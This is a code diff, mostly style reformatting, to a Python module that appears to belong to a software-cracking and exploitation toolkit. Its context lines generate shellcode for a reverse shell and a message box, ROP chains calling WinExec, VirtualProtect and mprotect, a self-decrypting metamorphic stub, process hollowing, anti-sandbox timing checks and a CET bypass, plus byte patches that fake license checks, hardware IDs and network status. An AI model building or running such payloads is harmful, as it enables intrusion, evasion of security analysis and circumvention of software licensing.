@@ -198,10 +198,7 @@ class PayloadGenerator:
             )
         if shellcode_type == "msgbox":
             # Windows x86 MessageBoxA
-            return (
-                b"\x31\xd2\x52\x68\x48\x65\x6c\x6c\x68\x6f\x20\x57\x6f"
-                b"\x72\x6c\x64\x21\x00\x89\xe1\x52\x51\x51\x52\xff\xd0"
-            )
+            return b"\x31\xd2\x52\x68\x48\x65\x6c\x6c\x68\x6f\x20\x57\x6f\x72\x6c\x64\x21\x00\x89\xe1\x52\x51\x51\x52\xff\xd0"
         return b"\x90" * 16  # NOP sled as fallback
 
     def _generate_reverse_shell(self, **kwargs) -> bytes:
@@ -211,13 +208,7 @@ class PayloadGenerator:
 
         # Basic x86 reverse shell template
         # This is a simplified version - real implementation would be more complex
-        return (
-            b"\x90" * 8
-            + b"\x31\xc0\x50\x68"
-            + host.encode()[:4]
-            + b"\x68\x02\x00"
-            + port.to_bytes(2, "big")
-        )
+        return b"\x90" * 8 + b"\x31\xc0\x50\x68" + host.encode()[:4] + b"\x68\x02\x00" + port.to_bytes(2, "big")
 
     def _generate_bind_shell(self, **kwargs) -> bytes:
         """Generate bind shell payload."""
@@ -323,6 +314,7 @@ class PayloadGenerator:
             try:
                 # Import gadget finder if available
                 from intellicrack.core.analysis.gadget_finder import find_gadgets
+
                 gadgets = find_gadgets(base_addr)
                 pop_ebp_ret = gadgets.get("pop_ebp_ret", base_addr)
                 pop_ebx_ret = gadgets.get("pop_ebx_ret", base_addr)
@@ -355,6 +347,7 @@ class PayloadGenerator:
             # ROP chain to call WinExec
             try:
                 from intellicrack.core.analysis.gadget_finder import find_gadgets
+
                 gadgets = find_gadgets(base_addr)
                 pop_ecx_ret = gadgets.get("pop_ecx_ret", base_addr)
                 pop_edx_ret = gadgets.get("pop_edx_ret", base_addr)
@@ -375,6 +368,7 @@ class PayloadGenerator:
             # Linux ROP chain for mprotect
             try:
                 from intellicrack.core.analysis.gadget_finder import find_gadgets
+
                 gadgets = find_gadgets(base_addr)
                 pop_eax_ret = gadgets.get("pop_eax_ret", base_addr)
                 pop_ebx_ret = gadgets.get("pop_ebx_ret", base_addr)
@@ -417,8 +411,8 @@ class PayloadGenerator:
 
             pop_rcx_ret = base_addr + 0x1300  # pop rcx; ret
             pop_rdx_ret = base_addr + 0x1301  # pop rdx; ret
-            pop_r8_ret = base_addr + 0x1302   # pop r8; ret
-            pop_r9_ret = base_addr + 0x1303   # pop r9; ret
+            pop_r8_ret = base_addr + 0x1302  # pop r8; ret
+            pop_r9_ret = base_addr + 0x1303  # pop r9; ret
             virtualprotect = base_addr + 0x4000
 
             # Setup parameters
@@ -462,7 +456,7 @@ class PayloadGenerator:
         else:
             # Generic x64 ROP chain skeleton
             for i in range(8):
-                chain += (base_addr + 0x2000 + i*8).to_bytes(8, "little")
+                chain += (base_addr + 0x2000 + i * 8).to_bytes(8, "little")
 
         return bytes(chain)
 
@@ -517,17 +511,13 @@ class PayloadGenerator:
                 # Return current time + large offset (x64)
                 return b"\x48\xb8\xff\xff\xff\x7f\x00\x00\x00\x00\xc3"  # mov rax, 0x7fffffff; ret
             # Max time value (x64)
-            return (
-                b"\x48\xb8\xff\xff\xff\xff\xff\xff\xff\x7f\xc3"  # mov rax, 0x7fffffffffffffff; ret
-            )
+            return b"\x48\xb8\xff\xff\xff\xff\xff\xff\xff\x7f\xc3"  # mov rax, 0x7fffffffffffffff; ret
         # x86 implementation
         if preserve_registers:
             # Preserve registers with push/pop
             if bypass_method == "zero_time":
                 return b"\x50\x31\xc0\x58\xc3"  # push eax; xor eax, eax; pop eax; ret
-            return (
-                b"\x50\xb8\xff\xff\xff\x7f\x58\xc3"  # push eax; mov eax, 0x7fffffff; pop eax; ret
-            )
+            return b"\x50\xb8\xff\xff\xff\x7f\x58\xc3"  # push eax; mov eax, 0x7fffffff; pop eax; ret
         if bypass_method == "zero_time":
             return b"\x31\xc0\xc3"  # xor eax, eax; ret
         return b"\xb8\xff\xff\xff\x7f\xc3"  # mov eax, 0x7fffffff; ret
@@ -544,7 +534,7 @@ class PayloadGenerator:
             if bypass_method == "fake_hwid":
                 # Return dynamically generated HWID (x64)
                 dynamic_hwid = self._generate_dynamic_hwid(hwid_type, target_arch)
-                hwid_bytes = dynamic_hwid.to_bytes(8, byteorder='little')
+                hwid_bytes = dynamic_hwid.to_bytes(8, byteorder="little")
                 return b"\x48\xb8" + hwid_bytes + b"\xc3"  # mov rax, dynamic_hwid; ret
             if bypass_method == "null_hwid":
                 # Return null HWID (x64)
@@ -556,7 +546,7 @@ class PayloadGenerator:
             # Preserve stack with proper alignment
             if bypass_method == "fake_hwid":
                 dynamic_hwid = self._generate_dynamic_hwid(hwid_type, target_arch)
-                hwid_bytes = dynamic_hwid.to_bytes(4, byteorder='little')
+                hwid_bytes = dynamic_hwid.to_bytes(4, byteorder="little")
                 return b"\x50\xb8" + hwid_bytes + b"\x58\xc3"  # push eax; mov eax, dynamic_hwid; pop eax; ret
             if bypass_method == "null_hwid":
                 return b"\x50\x31\xc0\x58\xc3"  # push eax; xor eax, eax; pop eax; ret
@@ -564,7 +554,7 @@ class PayloadGenerator:
         if bypass_method == "fake_hwid":
             # Return dynamically generated HWID based on system characteristics
             dynamic_hwid = self._generate_dynamic_hwid(hwid_type, target_arch)
-            hwid_bytes = dynamic_hwid.to_bytes(4, byteorder='little')
+            hwid_bytes = dynamic_hwid.to_bytes(4, byteorder="little")
             return b"\xb8" + hwid_bytes + b"\xc3"  # mov eax, dynamic_hwid; ret
         if bypass_method == "null_hwid":
             return b"\x31\xc0\xc3"  # xor eax, eax; ret
@@ -583,22 +573,27 @@ class PayloadGenerator:
 
             if hwid_type == "cpu":
                 # Generate CPU-based HWID
-                system_info.extend([
-                    platform.processor(),
-                    platform.machine(),
-                    str(platform.architecture()),
-                ])
+                system_info.extend(
+                    [
+                        platform.processor(),
+                        platform.machine(),
+                        str(platform.architecture()),
+                    ]
+                )
 
                 # Try to get more detailed CPU info
                 try:
                     import cpuinfo
+
                     cpu_data = cpuinfo.get_cpu_info()
-                    system_info.extend([
-                        cpu_data.get('brand_raw', ''),
-                        cpu_data.get('family', ''),
-                        cpu_data.get('model', ''),
-                        str(cpu_data.get('stepping', 0)),
-                    ])
+                    system_info.extend(
+                        [
+                            cpu_data.get("brand_raw", ""),
+                            cpu_data.get("family", ""),
+                            cpu_data.get("model", ""),
+                            str(cpu_data.get("stepping", 0)),
+                        ]
+                    )
                 except ImportError:
                     # Fallback without cpuinfo
                     system_info.append(platform.processor())
@@ -607,11 +602,12 @@ class PayloadGenerator:
                 # Generate MAC-based HWID
                 try:
                     import psutil
+
                     # Get real network interfaces
                     interfaces = psutil.net_if_addrs()
                     for _interface_name, addresses in interfaces.items():
                         for addr in addresses:
-                            if addr.family.name == 'AF_LINK' and addr.address:
+                            if addr.family.name == "AF_LINK" and addr.address:
                                 system_info.append(addr.address)
                                 break
                 except ImportError:
@@ -623,21 +619,26 @@ class PayloadGenerator:
                 # Generate disk-based HWID
                 try:
                     import psutil
+
                     # Get disk information
-                    disk_usage = psutil.disk_usage('/')
-                    system_info.extend([
-                        str(disk_usage.total),
-                        str(disk_usage.used),
-                    ])
+                    disk_usage = psutil.disk_usage("/")
+                    system_info.extend(
+                        [
+                            str(disk_usage.total),
+                            str(disk_usage.used),
+                        ]
+                    )
 
                     # Get disk partitions
                     partitions = psutil.disk_partitions()
                     for partition in partitions[:3]:  # Limit to first 3
-                        system_info.extend([
-                            partition.device,
-                            partition.fstype,
-                            str(partition.maxfile),
-                        ])
+                        system_info.extend(
+                            [
+                                partition.device,
+                                partition.fstype,
+                                str(partition.maxfile),
+                            ]
+                        )
                 except ImportError:
                     # Fallback
                     system_info.append(platform.node())
@@ -646,24 +647,29 @@ class PayloadGenerator:
                 # Generate memory-based HWID
                 try:
                     import psutil
+
                     memory = psutil.virtual_memory()
-                    system_info.extend([
-                        str(memory.total),
-                        str(memory.available),
-                    ])
+                    system_info.extend(
+                        [
+                            str(memory.total),
+                            str(memory.available),
+                        ]
+                    )
                 except ImportError:
                     # Fallback
                     system_info.append(str(time.time()))
 
             else:  # generic or unknown type
                 # Generate generic system HWID
-                system_info.extend([
-                    platform.system(),
-                    platform.release(),
-                    platform.version(),
-                    platform.node(),
-                    str(uuid.uuid4().hex[:8]),
-                ])
+                system_info.extend(
+                    [
+                        platform.system(),
+                        platform.release(),
+                        platform.version(),
+                        platform.node(),
+                        str(uuid.uuid4().hex[:8]),
+                    ]
+                )
 
             # Add timestamp-based variation for uniqueness
             current_time = int(time.time())
@@ -671,19 +677,19 @@ class PayloadGenerator:
             system_info.append(str(time_variant))
 
             # Create hash from system information
-            combined_info = ''.join(system_info).encode('utf-8')
+            combined_info = "".join(system_info).encode("utf-8")
             hash_object = hashlib.sha256(combined_info)
             hash_bytes = hash_object.digest()
 
             # Convert to appropriate integer size
             if target_arch == "x64":
                 # Extract 8 bytes for 64-bit
-                hwid_int = int.from_bytes(hash_bytes[:8], byteorder='little')
+                hwid_int = int.from_bytes(hash_bytes[:8], byteorder="little")
                 # Ensure non-zero value
                 return hwid_int if hwid_int != 0 else 0x1337DEADBEEF1337
             else:
                 # Extract 4 bytes for 32-bit
-                hwid_int = int.from_bytes(hash_bytes[:4], byteorder='little')
+                hwid_int = int.from_bytes(hash_bytes[:4], byteorder="little")
                 # Ensure non-zero value
                 return hwid_int if hwid_int != 0 else 0x1337BEEF
 
@@ -792,7 +798,7 @@ class PayloadGenerator:
         if bypass_method == "fake_connection":
             # Dynamic connection simulation based on network state
             connection_status = self._generate_dynamic_connection_status(network_type)
-            status_bytes = connection_status.to_bytes(4, byteorder='little', signed=True)
+            status_bytes = connection_status.to_bytes(4, byteorder="little", signed=True)
             return b"\xb8" + status_bytes + b"\xc3"  # mov eax, dynamic_status; ret
         # Default network bypass
         return b"\xb8\x01\x00\x00\x00\xc3"  # mov eax, 1; ret
@@ -832,9 +838,7 @@ class AdvancedPayloadGenerator:
         # Map advanced payload types to generation methods
         generators = {
             # Bypass payloads
-            "license_bypass": lambda **kw: self.generate_license_bypass_payload(
-                kw.get("strategy", {})
-            ),
+            "license_bypass": lambda **kw: self.generate_license_bypass_payload(kw.get("strategy", {})),
             "advanced_auth_bypass": self._generate_advanced_auth_bypass,
             "multi_layer_bypass": self._generate_multi_layer_bypass,
             # Evasion payloads
@@ -1016,23 +1020,16 @@ class AdvancedPayloadGenerator:
                     b"\x48\x8b\x3c\x24"  # mov rdi, [rsp]
                     b"\x48\x83\xc7\x30"  # add rdi, 0x30
                 )
-                metamorphic_stub += b"\x48\xb9" + payload_size.to_bytes(
-                    8, "little"
-                )  # mov rcx, payload_size
-                metamorphic_stub += b"\x48\xb8" + mutation_key.to_bytes(
-                    8, "little"
-                )  # mov rax, mutation_key
+                metamorphic_stub += b"\x48\xb9" + payload_size.to_bytes(8, "little")  # mov rcx, payload_size
+                metamorphic_stub += b"\x48\xb8" + mutation_key.to_bytes(8, "little")  # mov rax, mutation_key
                 metamorphic_stub += (
-                    (
-                        b"\x48\x31\x07"  # xor [rdi], rax
-                        b"\x48\xff\xc7"  # inc rdi
-                        b"\xe2\xf8"  # loop
-                        b"\x5a"  # pop rdx
-                        b"\x59"  # pop rcx
-                        b"\x58"  # pop rax
-                    )
-                    + b"\x90" * payload_size
-                )  # payload space
+                    b"\x48\x31\x07"  # xor [rdi], rax
+                    b"\x48\xff\xc7"  # inc rdi
+                    b"\xe2\xf8"  # loop
+                    b"\x5a"  # pop rdx
+                    b"\x59"  # pop rcx
+                    b"\x58"  # pop rax
+                ) + b"\x90" * payload_size  # payload space
             else:
                 metamorphic_stub = (
                     b"\x50"  # push rax
@@ -1053,21 +1050,14 @@ class AdvancedPayloadGenerator:
                 b"\x8b\x3c\x24"  # mov edi, [esp]
                 b"\x83\xc7\x40"  # add edi, 0x40
             )
-            metamorphic_stub += b"\xb9" + payload_size.to_bytes(
-                4, "little"
-            )  # mov ecx, payload_size
-            metamorphic_stub += b"\xb8" + mutation_key.to_bytes(
-                4, "little"
-            )  # mov eax, mutation_key
+            metamorphic_stub += b"\xb9" + payload_size.to_bytes(4, "little")  # mov ecx, payload_size
+            metamorphic_stub += b"\xb8" + mutation_key.to_bytes(4, "little")  # mov eax, mutation_key
             metamorphic_stub += (
-                (
-                    b"\x31\x07"  # xor [edi], eax
-                    b"\x47"  # inc edi
-                    b"\xe2\xfa"  # loop
-                    b"\x61"  # popad
-                )
-                + b"\x90" * payload_size
-            )  # payload space
+                b"\x31\x07"  # xor [edi], eax
+                b"\x47"  # inc edi
+                b"\xe2\xfa"  # loop
+                b"\x61"  # popad
+            ) + b"\x90" * payload_size  # payload space
         elif mutation_complexity == "simple":
             metamorphic_stub = (
                 b"\x60"  # pushad
@@ -1221,9 +1211,7 @@ class AdvancedPayloadGenerator:
         suspend_threads = kwargs.get("suspend_threads", True)
 
         # Set creation flags based on suspend_threads parameter
-        creation_flags = (
-            b"\x04\x00\x00\x00" if suspend_threads else b"\x00\x00\x00\x00"
-        )  # CREATE_SUSPENDED or normal
+        creation_flags = b"\x04\x00\x00\x00" if suspend_threads else b"\x00\x00\x00\x00"  # CREATE_SUSPENDED or normal
 
         if arch == "x64":
             # x64 process hollowing shellcode
@@ -1685,11 +1673,7 @@ class AdvancedPayloadGenerator:
                 )
         else:
             # Default minimal CET bypass
-            bypass_code = (
-                b"\xf3\x0f\x1e\xfa\x90\x90\xc3"
-                if arch == "x64"
-                else b"\xf3\x0f\x1e\xfb\x90\x90\xc3"
-            )
+            bypass_code = b"\xf3\x0f\x1e\xfa\x90\x90\xc3" if arch == "x64" else b"\xf3\x0f\x1e\xfb\x90\x90\xc3"
 
         return bypass_code
 
@@ -1786,9 +1770,7 @@ class AdvancedPayloadGenerator:
 
     def _generate_anti_sandbox_payload(self, **kwargs) -> bytes:
         """Generate anti-sandbox evasion payload."""
-        detection_methods = kwargs.get(
-            "detection_methods", ["timing", "user_interaction", "artifacts"]
-        )
+        detection_methods = kwargs.get("detection_methods", ["timing", "user_interaction", "artifacts"])
         evasion_level = kwargs.get("evasion_level", "basic")
         arch = kwargs.get("arch", "x86")
         sleep_duration = kwargs.get("sleep_duration", 3000)
@@ -1808,9 +1790,7 @@ class AdvancedPayloadGenerator:
                     + b"\xff\x15\x00\x00\x00\x00"  # call [GetTickCount]
                     + b"\x48\x29\xd8"  # sub rax, rbx
                     + b"\x48\x3d"
-                    + (sleep_duration - 500).to_bytes(
-                        4, "little"
-                    )  # cmp rax, (sleep_duration - 500)
+                    + (sleep_duration - 500).to_bytes(4, "little")  # cmp rax, (sleep_duration - 500)
                     + b"\x7c\x10"  # jl sandbox_detected
                     + b"\xeb\x20"  # jmp normal_execution
                 )
@@ -1824,9 +1804,7 @@ class AdvancedPayloadGenerator:
                     + b"\xff\x15\x00\x00\x00\x00"  # call [GetTickCount]
                     + b"\x29\xd8"  # sub eax, ebx
                     + b"\x3d"
-                    + (sleep_duration - 500).to_bytes(
-                        4, "little"
-                    )  # cmp eax, (sleep_duration - 500)
+                    + (sleep_duration - 500).to_bytes(4, "little")  # cmp eax, (sleep_duration - 500)
                     + b"\x7c\x10"  # jl sandbox_detected
                     + b"\xeb\x15"  # jmp normal_execution
                 )
@@ -2048,9 +2026,7 @@ class AdvancedPayloadGenerator:
             bytes: Assembled machine code payload ready for injection or patching
 
         """
-        self.logger.info(
-            f"Generating license bypass payload for strategy: {strategy.get('strategy', 'generic_bypass')}"
-        )
+        self.logger.info(f"Generating license bypass payload for strategy: {strategy.get('strategy', 'generic_bypass')}")
 
         payload_generators = {
             "function_hijacking": self._function_hijack_payload,
@@ -2256,23 +2232,17 @@ class AdvancedPayloadGenerator:
             return None
 
         try:
-            formatted_assembly = "\n".join(
-                f"{i+1}: {line}" for i, line in enumerate(assembly_code.split("\n"))
-            )
+            formatted_assembly = "\n".join(f"{i + 1}: {line}" for i, line in enumerate(assembly_code.split("\n")))
             self.logger.debug("Assembling x86_64 code:\n%s", formatted_assembly)
 
             ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)
             encoding, count = ks.asm(assembly_code)
 
             if not encoding:
-                self.logger.warning(
-                    "Assembly produced empty encoding for code:\n%s", formatted_assembly
-                )
+                self.logger.warning("Assembly produced empty encoding for code:\n%s", formatted_assembly)
                 return None
 
-            self.logger.debug(
-                f"Successfully assembled {count} instructions ({len(encoding)} bytes)"
-            )
+            self.logger.debug(f"Successfully assembled {count} instructions ({len(encoding)} bytes)")
             return bytes(encoding)
 
         except (OSError, ValueError, RuntimeError) as e:
@@ -2683,9 +2653,7 @@ def generate_complete_api_hooking_script(app, hook_types=None) -> str:
         if "network" in hook_types:
             hook_names.append("Telemetry Blocking")
 
-        app.update_output.emit(
-            f"[Payload] Generated API hooking script for: {', '.join(hook_names)}"
-        )
+        app.update_output.emit(f"[Payload] Generated API hooking script for: {', '.join(hook_names)}")
 
     return final_script
 
